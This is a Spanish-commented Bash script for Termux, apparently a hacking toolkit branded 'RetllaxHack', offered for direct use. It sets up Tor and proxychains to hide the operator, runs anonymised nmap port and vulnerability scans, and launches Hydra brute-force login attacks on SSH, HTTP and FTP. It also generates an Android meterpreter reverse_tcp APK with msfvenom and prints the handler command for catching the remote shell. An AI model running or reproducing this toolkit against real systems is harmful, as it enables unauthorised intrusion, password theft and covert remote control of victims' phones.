#!/usr/bin/env bash

# ===== CONFIGURACIÓN RGB =====
function rgb {
  colors=("196" "40" "214" "39" "200" "226")
  echo -e "\033[38;5;${colors[$RANDOM % 6]}m$1\033[0m"
}

# ===== BANNER =====
function show_banner {
  clear
  echo
  rgb " ██████╗ ███████╗████████╗██╗  ██╗██╗  ██╗ █████╗ ██╗  ██╗"
  rgb "██╔════╝ ██╔════╝╚══██╔══╝██║  ██║╚██╗██╔╝██╔══██╗╚██╗██╔╝"
  rgb "██║  ███╗█████╗     ██║   ███████║ ╚███╔╝ ███████║ ╚███╔╝ "
  rgb "██║   ██║██╔══╝     ██║   ██╔══██║ ██╔██╗ ██╔══██║ ██╔██╗ "
  rgb "╚██████╔╝███████╗   ██║   ██║  ██║██╔╝ ██╗██║  ██║██╔╝ ██╗"
  rgb " ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝"
  rgb "               SHADOW EDITION + METASPLOIT v9.0.3"
  echo
  rgb "=== ESCANEO GLOBAL | FUERZA BRITA | EXPLOITS (NO ROOT) ==="
  echo
}

# ===== VERIFICAR DEPENDENCIAS =====
function check_deps {
  # Verificar e instalar Tor y Proxychains
  if ! command -v tor >/dev/null || ! command -v proxychains4 >/dev/null; then
    rgb "[~] Instalando Tor y Proxychains..."
    pkg install -y tor proxychains-ng
    # Configuración óptima de Proxychains
    sed -i 's/^strict_chain/#strict_chain\ndynamic_chain/' $PREFIX/etc/proxychains.conf
    sed -i 's/socks4.*/socks5 127.0.0.1 9050/' $PREFIX/etc/proxychains.conf
  fi

  # Verificar Nmap
  if ! command -v nmap >/dev/null; then
    rgb "[~] Instalando Nmap..."
    pkg install -y nmap
  fi

  # Verificar Hydra
  if ! command -v hydra >/dev/null; then
    rgb "[~] Instalando Hydra..."
    pkg install -y hydra
  fi

  # Verificar Metasploit
  if ! command -v msfconsole >/dev/null; then
    rgb "[~] Instalando Metasploit (1GB de espacio aprox)..."
    pkg install -y unstable-repo metasploit
    rgb "[~] Configurando PostgreSQL..."
    pg_ctl -D $PREFIX/var/lib/postgresql start >/dev/null 2>&1
  fi

  # Iniciar Tor con parámetros optimizados
  if ! pgrep -x "tor" >/dev/null; then
    rgb "[~] Iniciando Tor con configuración mejorada..."
    tor --RunAsDaemon 1 --CircuitBuildTimeout 30 --NumEntryGuards 3 &> /dev/null &
    sleep 8
  fi
}

# ===== ESCANEO GLOBAL OPTIMIZADO =====
function global_scan {
  read -p "$(rgb "[?] IP/Dominio a escanear (ej: scanme.nmap.org): ")" target
  read -p "$(rgb "[?] Puertos (ej: 80,443 o 1-1000): ")" ports

  rgb "[~] Iniciando escaneo en $target..."
  
  # Escaneo principal con reintentos
  if ! proxychains4 -q nmap -Pn -T4 --open --min-parallelism 20 --max-retries 3 --host-timeout 5m --min-rate 500 -p $ports $target -oN retllax_scan.log 2>&1; then
    rgb "[!] Falló escaneo con Tor, intentando sin proxy..."
    nmap -Pn -T4 --open -p $ports $target -oN retllax_scan.log
  fi

  # Análisis de vulnerabilidades solo si hay puertos abiertos
  if grep -q "open" retllax_scan.log; then
    rgb "[~] Analizando vulnerabilidades..."
    open_ports=$(grep "open" retllax_scan.log | awk -F'/' '{print $1}' | tr '\n' ',')
    proxychains4 -q nmap -Pn --script vuln -p ${open_ports%,} $target >> retllax_vulns.log 2>&1
  fi

  # Mostrar resultados
  rgb "[✔] Resultados del escaneo:"
  if grep -q "open" retllax_scan.log; then
    grep --color "open" retllax_scan.log
  else
    rgb "[!] No se encontraron puertos abiertos"
    
    # Prueba de conectividad básica
    rgb "[~] Realizando prueba de conexión básica..."
    timeout 3 bash -c "echo > /dev/tcp/$(echo $target | sed 's/[^0-9.]//g')/80" 2>/dev/null && \
    rgb "[⚠️] El puerto 80 responde pero podría estar filtrado" || \
    rgb "[ℹ️] No hay respuesta del objetivo"
  fi
  
  # Mostrar vulnerabilidades si existen
  if [ -f "retllax_vulns.log" ] && grep -q "VULNERABLE\|CVE-" retllax_vulns.log; then
    rgb "[!] Vulnerabilidades detectadas:"
    grep --color -E "VULNERABLE|CVE-" retllax_vulns.log
  fi
}

# ===== HYDRA SHADOW OPTIMIZADO =====
function hydra_attack {
  read -p "$(rgb "[?] IP/Dominio: ")" target
  read -p "$(rgb "[?] Usuario (ej: admin): ")" user
  read -p "$(rgb "[?] Ruta al diccionario: ")" wordlist

  rgb "[~] Detectando servicios..."
  service=$(proxychains4 -q nmap -Pn -p- --open $target 2>/dev/null | grep "open" | head -n 1 | awk '{print $3}')
  
  case $service in
    ssh) port=22 ;;
    http|http-proxy) port=80 ;;
    ftp) port=21 ;;
    *) read -p "$(rgb "[?] Puerto manual: ")" port ;;
  esac

  rgb "[~] Atacando $service ($target:$port)..."
  proxychains4 -q hydra -l $user -P $wordlist -t 4 -s $port $target $service -o retllax_hydra.log 2>&1

  rgb "[+] Resultados:"
  if grep -q "login:" retllax_hydra.log; then
    grep --color "login:" retllax_hydra.log
  else
    rgb "[!] No se encontraron credenciales válidas"
  fi
}

# ===== METASPLOIT CON MANEJO DE ERRORES =====
function metasploit_mod {
  # Iniciar PostgreSQL si no está activo
  if ! pgrep postgres >/dev/null; then
    rgb "[~] Iniciando PostgreSQL..."
    pg_ctl -D $PREFIX/var/lib/postgresql start >/dev/null 2>&1
    sleep 5
  fi

  show_banner
  rgb "[!] Módulos Disponibles:"
  rgb "1) Generar Payload Android"
  rgb "2) Buscar Exploits"
  rgb "3) Escanear Red (Auxiliar)"
  echo
  read -p "$(rgb "[?] Opción: ")" opt

  case $opt in
    1)
      read -p "$(rgb "[?] LHOST (tu IP): ")" lhost
      read -p "$(rgb "[?] LPORT (4444): ")" lport
      if msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o retllax_payload.apk 2>/dev/null; then
        rgb "[✔] Payload generado: retllax_payload.apk"
        rgb "[!] Usa: msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit'"
      else
        rgb "[!] Error al generar payload. Verifica Metasploit."
      fi
      ;;
    2)
      read -p "$(rgb "[?] Buscar (ej: Apache): ")" query
      msfconsole -q -x "search $query; exit" 2>/dev/null || rgb "[!] Error en la búsqueda"
      ;;
    3)
      read -p "$(rgb "[?] IP/Rango (ej: 192.168.1.0/24): ")" target
      msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS $target; run; exit" 2>/dev/null || rgb "[!] Error en escaneo"
      ;;
    *) rgb "[!] Opción no válida";;
  esac
}

# ===== MENÚ PRINCIPAL =====
function main_menu {
  check_deps
  while true; do
    show_banner
    rgb "1) Escaneo Global (Tor)"
    rgb "2) Ataque Hydra Shadow"
    rgb "3) Módulo Metasploit"
    rgb "4) Ver Logs"
    rgb "5) Salir"
    echo
    read -p "$(rgb "[?] Elige una opción: ")" opt

    case $opt in
      1) global_scan ;;
      2) hydra_attack ;;
      3) metasploit_mod ;;
      4)
        rgb "[📁] Logs disponibles:"
        [ -f "retllax_scan.log" ] && echo "- Escaneos: retllax_scan.log" || rgb "[!] No hay logs de escaneo"
        [ -f "retllax_vulns.log" ] && echo "- Vulnerabilidades: retllax_vulns.log" || rgb "[!] No hay logs de vulnerabilidades"
        [ -f "retllax_hydra.log" ] && echo "- Hydra: retllax_hydra.log" || rgb "[!] No hay logs de Hydra"
        ;;
      5)
        pkill -f tor 2>/dev/null
        rgb "[!] Saliendo de RetllaxHack..."
        exit 0
        ;;
      *)
        rgb "[!] Opción no válida"
        sleep 1
        ;;
    esac
    read -p "$(rgb "[?] Presiona Enter para continuar...")"
  done
}

# ===== INICIO =====
show_banner
main_menu
